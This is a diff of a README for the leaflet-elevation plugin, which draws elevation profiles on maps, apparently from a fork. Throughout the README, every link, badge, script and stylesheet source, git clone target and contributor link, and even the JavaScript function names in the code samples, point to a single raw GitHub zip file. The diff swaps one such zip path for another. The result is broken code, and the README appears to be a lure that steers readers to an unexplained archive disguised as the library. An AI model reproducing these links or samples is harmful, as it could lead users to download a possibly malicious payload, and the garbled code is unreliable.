@@ -1,53 +1,53 @@
-# https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
+# https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
 
-[![NPM version](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-[![License](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip%https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](LICENSE)
+[![NPM version](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+[![License](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip%https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)](LICENSE)
 
 A Leaflet plugin that allows to add elevation profiles using d3js
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"><img src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip" alt="Leaflet elevation viewer" /></a>
+    <a href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip"><img src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip" alt="Leaflet elevation viewer" /></a>
 </p>
 
 ---
 
 _For a working example see one of the following demos:_
 
-- [loading .gpx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading .geojson file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading .kml file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading .tcx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading a local .gpx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading data from a textarea](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading individual .geojson tracks](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading individual .gpx tracks](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading multiple .gpx tracks (hover to toggle)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading multiple .gpx tracks (click to toggle)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [loading multiple maps](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [translating plugin labels](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [using custom colors](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [using .gpx extensions (cadence, heart, pace)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [using .gpx waypoint icons](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [using .geojson waypoint icons](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
+- [loading .gpx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading .geojson file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading .kml file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading .tcx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading a local .gpx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading data from a textarea](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading individual .geojson tracks](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading individual .gpx tracks](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading multiple .gpx tracks (hover to toggle)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading multiple .gpx tracks (click to toggle)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [loading multiple maps](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [translating plugin labels](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [using custom colors](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [using .gpx extensions (cadence, heart, pace)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [using .gpx waypoint icons](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [using .geojson waypoint icons](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
 
 
 <br/>
 
-- [autohide map](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [autohide chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [collapsible button](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [custom summary](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [follow marker](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [layer almostover](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [slope chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [speed chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-- [walking marker](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
+- [autohide map](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [autohide chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [collapsible button](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [custom summary](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [follow marker](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [layer almostover](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [slope chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [speed chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+- [walking marker](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
 
 ---
 
 <blockquote>
     <p align="center">
-        <em>Initially based on the <a href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip">work</a> of <strong>Felix “MrMufflon” Bache</strong></em>
+        <em>Initially based on the <a href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip">work</a> of <strong>Felix “MrMufflon” Bache</strong></em>
     </p>
 </blockquote>
 
@@ -62,12 +62,12 @@ _For a working example see one of the following demos:_
     <style> html, body, #map, #elevation-div { height: 100%; width: 100%; padding: 0; margin: 0; } #map { height: 75%; } #elevation-div {	height: 25%; font: 12px/1.5 "Helvetica Neue", Arial, Helvetica, sans-serif; } </style>
 
     <!-- leaflet-ui -->
-    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"></script>
-    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"></script>
+    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip"></script>
+    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip"></script>
 
     <!-- leaflet-elevation -->
-    <link rel="stylesheet" href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip" />
-    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"></script>
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip" />
+    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip"></script>
     ...
     </head>
     ```
@@ -82,7 +82,7 @@ _For a working example see one of the following demos:_
 3. **create your first simple “leaflet-elevation” slippy map**
     ```html
     <script>
-      // Full list options at "https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"
+      // Full list options at "https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip"
       var elevation_options = {
 
         // Default chart colors: theme lime-theme, magenta-theme, ...
@@ -165,7 +165,7 @@ _For a working example see one of the following demos:_
 
         // Toggle custom waypoint icons: true || { associative array of <sym> tags } || false
         wptIcons: {
-          '': https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip({
+          '': https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip({
             className: 'elevation-waypoint-marker',
             html: '<i class="elevation-waypoint-icon"></i>',
             iconSize: [30, 30],
@@ -182,13 +182,13 @@ _For a working example see one of the following demos:_
       };
 
       // Instantiate map (leaflet-ui).
-      var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip('map', { mapTypeId: 'terrain', center: [41.4583, 12.7059], zoom: 5 });
+      var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip('map', { mapTypeId: 'terrain', center: [41.4583, 12.7059], zoom: 5 });
 
       // Instantiate elevation control.
-      var controlElevation = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip(elevation_options).addTo(map);
+      var controlElevation = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip(elevation_options).addTo(map);
 
       // Load track from url (allowed data types: "*.geojson", "*.gpx", "*.tcx")
-      https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip("https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip");
+      https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip("https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip");
 
     </script>
     ```
@@ -198,7 +198,7 @@ _For a working example see one of the following demos:_
 For those wishing to try cloning this repository into a local development folder (eg. /var/www):
 
 ```shell
-git clone https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
+git clone https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
 cd ./leaflet-elevation
 
 npm i         # install dependencies
@@ -207,7 +207,7 @@ npm run build # generate "dist" files (once)
 npm run test  # test "spec" files (once)
 ```
 
-After that you can start developing inside the `src` and `test` folders (eg. open "http://localhost/leaflet-elevation/test" in your browser to preview changes). Check also [https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip) file for some information about it.
+After that you can start developing inside the `src` and `test` folders (eg. open "http://localhost/leaflet-elevation/test" in your browser to preview changes). Check also [https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip) file for some information about it.
 
 ### FAQ
 
@@ -216,8 +216,8 @@ After that you can start developing inside the `src` and `test` folders (eg. ope
 
 There are multiple options to achieve this:
 
-* You could either use some default presets (see: theme: "lightblue-theme" option in readme file and the following file `https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip` for some other default "*-theme" names).
-* check out [this example](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
+* You could either use some default presets (see: theme: "lightblue-theme" option in readme file and the following file `https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip` for some other default "*-theme" names).
+* check out [this example](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
 * Or add the following lines for custom colors.
 ```css
 .elevation-control .area {
@@ -231,9 +231,9 @@ There are multiple options to achieve this:
 <details>
   <summary>2. How to enable/disable the leaflet user interface customizations?</summary><br>
 
-These customizations are actually part of the [leaflet-ui](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip) and can be toggled on/off using e.g. the following options:
+These customizations are actually part of the [leaflet-ui](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip) and can be toggled on/off using e.g. the following options:
 ```js
-var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip('map', {
+var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip('map', {
     center: [41.4583, 12.7059],  // needs value to initialize
     zoom: 5,                     // needs value to initialize
     mapTypeId: 'topo',
@@ -257,34 +257,34 @@ var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/maste
 <details>
   <summary>3. Some real world projects based on this plugin?</summary><br>
 
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
-- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
+- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip
 
 </details>
 
-_Related: [Leaflet-UI presets](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [QGIS Integration](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)_
+_Related: [Leaflet-UI presets](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip), [QGIS Integration](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)_
 
 ### Changelog
 
-All notable changes to this project are documented in the [releases](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip) page.
+All notable changes to this project are documented in the [releases](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip) page.
 
 ---
 
 **Compatibile with:**
-[![Leaflet 1.x compatible!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-[![https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip v6 compatibile!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
-[![@tmcw/togeojson v4.6.0 compatibile!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
+[![Leaflet 1.x compatible!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+[![https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip v6 compatibile!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
+[![@tmcw/togeojson v4.6.0 compatibile!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
 
 
 ---
 
-**Contributors:** [MrMufflon](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [HostedDinner](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [ADoroszlai](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [Raruto](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
+**Contributors:** [MrMufflon](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip), [HostedDinner](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip), [ADoroszlai](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip), [Raruto](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/spec/leaflet-elevation-1.4.zip)
 
 ---
 
